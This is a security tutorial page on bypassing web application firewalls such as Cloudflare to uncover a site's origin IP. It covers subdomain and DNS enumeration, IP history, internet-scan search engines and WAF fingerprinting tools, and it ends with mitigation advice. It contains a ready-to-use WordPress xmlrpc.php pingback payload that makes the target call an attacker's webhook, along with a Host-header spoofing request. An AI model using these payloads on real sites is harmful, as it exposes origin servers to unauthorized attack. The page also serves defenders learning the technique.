---
title: Firewall Bypassing - Databased Index
permalink: /waf-bypassing
---

<link rel="stylesheet" type="text/css" href="css/styles.css">
<link rel="stylesheet" type="text/css" href="css/font.css">
<link rel="stylesheet" type="text/css" href="css/posts.css">

### <ins>Type of vulnerability: Information Disclosure (CWE-200)</ins>

### What is a firewall?
Firewalls, or WAFs ___(Web Application Firewall)___, are filters and rules of access that serve as a sort of "gateway" to keep your website secure. Basically keeping your website safe from threats and potential vulnerabilities that could be easily exploited if you otherwise didn't have a WAF. 

The most commonly used WAF is Cloudflare, for being easy to setup and maintain. But Cloudflare isn't all that secure as people may think and your common _"top 10 best firewalls to keep your website secure"_ may suggest.

Since it is one of the easiests WAFs to setup, it is also one of the easiests WAFs to bypass if you don't know how to setup your website correctly or you just don't have full access to the things you are managing on your website, which, in most cases, can paint a bright red target on your website's back.

### What are you looking for when bypassing a firewall?

A subdomain that's not being tunnelled through the WAF or the ___origin IP___ of the website, aka: the IP behind the firewall.

The firewall itself might have its own IP, which is the case for Cloudflare. The firewall's IP is not directly accessible.

### What can a bypass leave you vulnerable to?
It depends on how much information an attacker has on your website, if they already have found a potential vulnerability and the depth of understanding they may have on your website

This can vary from a simple XSS to a full blown Remote Code Execution vulnerability.

But anyway, you're probably not here to read my personal comments on firewalls and how they can give you a false sense of security at times.

Usually the only thing stopping an attacker from gaining complete access to your website is the firewall, which if not setup correctly, can be just a glass door waiting for a brick to be thrown through it.

So,
### How to bypass WAFs?

There are multiple ways to do that, and all of them are pretty easy, given the right conditions (which are usually the case).

#### <ins>Subdomain Method</ins>

This is the easiest one since it doesn't even involve interacting directly with the target, but instead just enumerating all of the target's subdomains, along with their IP addresses. In most cases, the website will just have an unprotected IP that can be accessed directly with no real issue

|Resources|Status|Price|
|---------|------|-----|
|[subdomainfinder.c99.nl](https://subdomainfinder.c99.nl/)|✅UP|Free|
|[dnsdumpster.com](https://dnsdumpster.com/)|✅UP|Free|
|[shodan.io](https://shodan.io/)|✅UP|Free / Paid for more advanced scans|
|[search.censys.io](https://search.censys.io/)|✅UP|Free / Paid for more advanced scans|
|[fofa.info](https://en.fofa.info)|✅UP|Free / Paid for more advanced scans|
|[Anubis (tool)](https://github.com/jonluca/Anubis)|✅UP|Free|

In some cases the server will be setup in such a way that even if the unprotected IP is accessed directly, it will still show different results from the target. In such occasions, it ___might___ mean that the IP is being shared with other hosts.
In case of the IP being shared, the discrepancy in results can be easily circumvented by setting your Host request headers as the website's URL and not the IP itself.

FOR THE SITUATION DESCRIBED ABOVE, instead of doing:
```
POST /  HTTP 1.1
Host: <Target Unprotected IP>
```

Do

```
POST /  HTTP 1.1
Host: <Target URL(Without HTTPS)>
```

That way the IP can still be accessed directly if you search it up in your searchbar, but the server will be receiving requests for the protected URL instead, thus not only rendering the website's content but also verifying that the IP in fact belongs to that URL.

___PS: The IP you search up in the searchbar has to be linked to the URL you set in the "Host" header for the contents to load, since that's how the server distinguishes what website is being requested from the shared IP___

#### <ins>DNS Record Method</ins>
When looking for IPs and unprotected subdomains, it's also important to look for IPs or domains listed mainly in **MX** and **TXT** records.

|Resources|Status|Price|
|---------|------|-----|
|[dnsdumpster.com](https://dnsdumpster.com/)|✅UP|Free|
|[dig](https://command-not-found.com/dig)|COMMAND|Free|

#### <ins>IP History Method</ins>
This method is also pretty easy. You can just get a list of the IPs that were used by the website along time. 

|Resources|Status|Price|
|---------|------|-----|
|[viewdns.info](https://viewdns.info/)|✅UP|Free|


#### <ins>Forensics Search Method</ins>
This basically involves searching up the domain on the following websites.  

|Resources|Status|Price|
|---------|------|-----|
|[shodan.io](https://shodan.io/)|✅UP|Free / Paid for more advanced scans|
|[search.censys.io](https://search.censys.io/)|✅UP|Free / Paid for more advanced scans|
|[fofa.info](https://en.fofa.info)|✅UP|Free / Paid for more advanced scans|

#### <ins>XMLRPC.php Method (Wordpress exclusive)</ins>
If the target uses Wordpress, it is also very likely to have XMLRPC enabled. (In some cases it doesn't tho, so that's when the rest of the things earlier apply).

To bypass a WAF protecting a wordpress domain, the following method is followed:

```
POST /xmlrpc.php HTTP/1.1
Host: TARGET_URL
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>WEBHOOK_UNIQUE_URL</string>
  </value>
 </param>
 <param>
  <value>
   <string>VALID_POST_FROM_TARGET</string>
  </value>
 </param>
</params>
</methodCall>
```

This is an old one but incredibly still effective!

What the attacker does is basically:

> Replace the ```TARGET_URL``` with the url of the website.

> Replace ```WEBHOOK_UNIQUE_URL``` with a webhook that will be used to catch the pingback response

> Replace ```VALID_POST_FROM_TARGET``` with a post that's been made on the website

> I.E: https://example.com/2025/03/10/is-a-nuclear-powered-marine-sector-a-possibility/

|Resources|Status|Price|
|---------|------|-----|
|[webhook.site](https://webhook.site/)|✅UP|Free|

#### <ins>Fingerprinting WAFs</ins>
Fingerprinting a WAF can be done in some ways, but the main ones are by using automation tools or manually.

Doing it manually requires you to analyze the behavior of the website to certain actions you take in it, such as trying to XSS an input field or uploading a malicious file. Also analyzing response headers and cookies for clues. 

Cloudflare can be easily spotted because of the custom 'cf-*' headers it sets.

Automation tools:

|Resources|Status|Price|
|---------|------|-----|
|[SuIP.biz](https://suip.biz/)|✅UP|Free|
|[Wappalyzer](https://www.wappalyzer.com/)|✅UP (Add-On)|Free|
|[Wafw00f](https://github.com/EnableSecurity/wafw00f)|✅UP|Free|
|[Nikto](https://github.com/sullo/nikto)|✅UP|Free|

#### <ins>Mitigating Attacks</ins>
To avoid getting your website's origin IP leaked, here are some steps you could take:

- Make sure to tunnel all subdomains through your WAF.
- Do not set your website's IP as an MX IP, instead use other mailing services as MX records cannot be proxied.
- Make sure that if/when the Origin IP leaks, your code is secure enough to handle input tampering.
- Setup your server in a way that forbids a client to connect directly do the IP, hitting the client with either a 403 status or a redirect to the main page.
- Check if the Host header and the requested base URL match
- Set the backend to only accept requests from the main website. This can be done via CORS.
